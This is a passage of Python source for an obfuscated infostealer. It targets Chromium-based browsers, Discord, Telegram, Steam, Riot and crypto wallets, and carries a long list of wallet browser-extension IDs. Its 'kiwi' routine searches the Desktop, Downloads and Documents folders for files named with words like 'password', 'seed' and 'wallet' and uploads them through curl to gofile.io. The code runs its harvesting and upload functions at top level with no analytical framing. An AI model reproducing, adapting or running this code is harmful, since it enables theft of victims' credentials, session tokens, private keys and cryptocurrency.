        [f"{local}/Yandex/YandexBrowserBeta/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserTech/User Data",             "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Yandex/YandexBrowserSxS/User Data",              "yandex.exe",       "/Default/Local Storage/leveldb",   "/Default/",     "/Default/Network",     "/HougaBouga/"                                    ],
        [f"{local}/Microsoft/Edge/User Data",                       "edge.exe",         "/Default/Local Storage/leveldb",   "/Default",      "/Default/Network",     "/Default/Local Extension Settings/"              ]
    ]
    d15C0rDP47H5 = [
        [f"{roaming}/discord",          "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord",        "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary",    "/Local Storage/leveldb"],
        [f"{roaming}/discordptb",       "/Local Storage/leveldb"],
    ]

    p47H570Z1P = [
        [f"{roaming}/atomic/Local Storage/leveldb",                             "Atomic Wallet.exe",        "Wallet"        ],
        [f"{roaming}/Guarda/Local Storage/leveldb",                             "Guarda.exe",               "Wallet"        ],
        [f"{roaming}/Zcash",                                                    "Zcash.exe",                "Wallet"        ],
        [f"{roaming}/Armory",                                                   "Armory.exe",               "Wallet"        ],
        [f"{roaming}/bytecoin",                                                 "bytecoin.exe",             "Wallet"        ],
        [f"{roaming}/Exodus/exodus.wallet",                                     "Exodus.exe",               "Wallet"        ],
        [f"{roaming}/Binance/Local Storage/leveldb",                            "Binance.exe",              "Wallet"        ],
        [f"{roaming}/com.liberty.jaxx/IndexedDB/file__0.indexeddb.leveldb",     "Jaxx.exe",                 "Wallet"        ],
        [f"{roaming}/Electrum/wallets",                                         "Electrum.exe",             "Wallet"        ],
        [f"{roaming}/Coinomi/Coinomi/wallets",                                  "Coinomi.exe",              "Wallet"        ],
        ["C:\Program Files (x86)\Steam\config",                                 "steam.exe",                "Steam"         ],
        [f"{local}/Riot Games/Riot Client/Data",                                "RiotClientServices.exe",   "RiotClient"    ],
    ]
    t3136r4M = [f"{roaming}/Telegram Desktop/tdata", 'Telegram.exe', "Telegram"]


    for patt in br0W53rP47H5:
       S74r77Hr34D(G3770K3N,   [patt[0], patt[2]]                                   )
    for patt in d15C0rDP47H5:
       S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
    S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
    S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
    for thread in THr34D1157:
        thread.join()
    
def UP104D7060F113(path):
    try:
        r = subprocess.Popen(f"curl -F \"file=@{path}\" https://{gofileserver}.gofile.io/uploadFile", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
        return loads(r[0].decode('utf-8'))["data"]["downloadPage"]
    except: return False

def K1W1F01D3r(pathF, keywords):
    global K1W1F113s
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file): return
        i += 1
        if i <= maxfilesperdir:
            url = UP104D7060F113(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    K1W1F113s.append(["folder", pathF + "/", ffound])

K1W1F113s = []
def K1W1F113(path, keywords):
    global K1W1F113s
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and os.stat(path + "/" + file).st_size < 500000 and not ".lnk" in file:
                    fifound.append([path + "/" + file, UP104D7060F113(path + "/" + file)])
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    K1W1F01D3r(target, keywords)
                    break

    K1W1F113s.append(["folder", path, fifound])

def K1W1():
    user = temp.split("\AppData")[0]
    path2search = [
        user    + "/Desktop",
        user    + "/Downloads",
        user    + "/Documents",
        roaming + "/Microsoft/Windows/Recent",
    ]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "bot",
        "atomic",
        "account",
        "acount",
        "paypal",
        "banque",
        "bot",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
        "seed",
        "mnemonic"
        "memoric",
        "private",
        "key",
        "passphrase",
        "pass",
        "phrase",
        "steal",
        "bank",
        "info",
        "casino",
        "prv",
        "privé",
        "prive",
        "telegram",
        "identifiant",
        "personnel",
        "trading"
        "bitcoin",
        "sauvegarde",
        "funds",
        "récupé",
        "recup",
        "note",
    ]
   
    wikith = []
    for patt in path2search: 
        kiwi = threading.Thread(target=K1W1F113, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith

def filestealr():
    wikith = K1W1()

    for thread in wikith: thread.join()
    time.sleep(0.2)

    filetext = "\n"
    for arg in K1W1F113s:
        if len(arg[2]) != 0:
            foldpath = arg[1].replace("\\", "/")
            foldlist = arg[2]
            filetext += f"📁 {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[len(a)-1]
                b = ffil[1]
                filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
            filetext += "\n"
    UP104D("kiwi", filetext)

global k3YW0rd, c00K1W0rDs, p45WW0rDs, C00K1C0UNt, P455WC0UNt, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157

DETECTED = False
w411375 = [
    ["nkbihfbeogaeaoehlefnkodbefgpgknn", "Metamask"         ],
    ["ejbalbakoplchlghecdalmeeeajnimhm", "Metamask"         ],
    ["fhbohimaelbohpjbbldcngcnapndodjp", "Binance"          ],
    ["hnfanknocfeofbddgcijnmhnfnkdnaad", "Coinbase"         ],
    ["fnjhmkhhmkbjkkabndcnnogagogbneec", "Ronin"            ],
    ["egjidjbpglichdcondbcbdnbeeppgdph", "Trust"            ],
    ["ojggmchlghnjlapmfbnjholfjkiidbch", "Venom"            ],
    ["opcgpfmipidbgpenhmajoajpbobppdil", "Sui"              ],
    ["efbglgofoippbgcjepnhiblaibcnclgk", "Martian"          ],
    ["ibnejdfjmmkpcnlpebklmnkoeoihofec", "Tron"             ],
    ["ejjladinnckdgjemekebdpeokbikhfci", "Petra"            ],
    ["phkbamefinggmakgklpkljjmgibohnba", "Pontem"           ],
    ["ebfidpplhabeedpnhjnobghokpiioolj", "Fewcha"           ],
    ["afbcbjpbpfadlkmhmclhkeeodmamcflc", "Math"             ],
    ["aeachknmefphepccionboohckonoeemg", "Coin98"           ],
    ["bhghoamapcdpbohphigoooaddinpkbai", "Authenticator"    ],
    ["aholpfdialjgjfhomihkjbmgjidlcdno", "ExodusWeb3"       ],
    ["bfnaelmomeimhlpmgjnjophhpkkoljpa", "Phantom"          ],
    ["agoakfejjabomempkjlepdflaleeobhb", "Core"             ],
    ["mfgccjchihfkkindfppnaooecgfneiii", "Tokenpocket"      ],
    ["lgmpcpglpngdoalbgeoldeajfclnhafa", "Safepal"          ],
    ["bhhhlbepdkbapadjdnnojkbgioiodbic", "Solfare"          ],
    ["jblndlipeogpafnldhgmapagcccfchpi", "Kaikas"           ],
    ["kncchdigobghenbbaddojjnnaogfppfj", "iWallet"          ],
    ["ffnbelfdoeiohenkjibnmadjiehjhajb", "Yoroi"            ],
    ["hpglfhgfnhbgpjdenjgmdgoeiappafln", "Guarda"           ],
    ["cjelfplplebdjjenllpjcblmjkfcffne", "Jaxx Liberty"     ],
    ["amkmjjmmflddogmhpjloimipbofnfjih", "Wombat"           ],
    ["fhilaheimglignddkjgofkcbgekhenbh", "Oxygen"           ],
    ["nlbmnnijcnlegkjjpcfjclmcfggfefdm", "MEWCX"            ],
    ["nanjmdknhkinifnkgdcggcfnhdaammmj", "Guild"            ],
    ["nkddgncdjgjfcddamfgcmfnlhccnimig", "Saturn"           ], 
    ["aiifbnbfobpmeekipheeijimdpnlpgpp", "TerraStation"     ],
    ["fnnegphlobjdpkhecapkijjdkgcjhkib", "HarmonyOutdated"  ],
    ["cgeeodpfagjceefieflmdfphplkenlfk", "Ever"             ],
    ["pdadjkfkgcafgbceimcpbkalnfnepbnk", "KardiaChain"      ],
    ["mgffkfbidihjpoaomajlbgchddlicgpn", "PaliWallet"       ],
    ["aodkkagnadcbobfpggfnjeongemjbjca", "BoltX"            ],
    ["kpfopkelmapcoipemfendmdcghnegimn", "Liquality"        ],
    ["hmeobnfnfcmdkdcmlblgagmfpfboieaf", "XDEFI"            ],
    ["lpfcbjknijpeeillifnkikgncikgfhdo", "Nami"             ],
    ["dngmlblcodfobpdpecaadgfbcggfjfnm", "MaiarDEFI"        ],
    ["ookjlbkiijinhpmnjffcofjonbfbgaoc", "TempleTezos"      ],
    ["eigblbgjknlfbajkfhopmcojidlgcehm", "XMR.PT"           ],
]
IP = G371P()
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

k3YW0rd = ['[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[github](https://github.com)', '[stake](https://stake.com)']
C00K1C0UNt, P455WC0UNt, CC5C0UNt, AU70F111C0UNt, H1570rYC0UNt, B00KM4rK5C0UNt = 0, 0, 0, 0, 0, 0
c00K1W0rDs, p45WW0rDs, H1570rY, CCs, P455w, AU70F11l, C00K13s, W411375Z1p, G4M1N6Z1p, O7H3rZ1p, THr34D1157, K1W1F113s, B00KM4rK5, T0K3Ns = [], [], [], [], [], [], [], [], [], [], [], [], [], ''

try:gofileserver = loads(urlopen("https://api.gofile.io/getServer").read().decode('utf-8'))["data"]["server"]
except:gofileserver = "store4"
GLINFO = G108411NF0()


G47H3r411()
wikith = K1W1()

for thread in wikith: thread.join()
time.sleep(0.2)

filetext = "\n"
for arg in K1W1F113s:
    if len(arg[2]) != 0:
        foldpath = arg[1]
        foldlist = arg[2]       
        filetext += f"<:openfolder:1111408286332375040> {foldpath}\n"

        for ffil in foldlist:
            a = ffil[0].split("/")
            fileanme = a[len(a)-1]
            b = ffil[1]
            filetext += f"└─<:openfolder:1111408286332375040> [{fileanme}]({b})\n"
        filetext += "\n"
UP104D("kiwi", filetext)
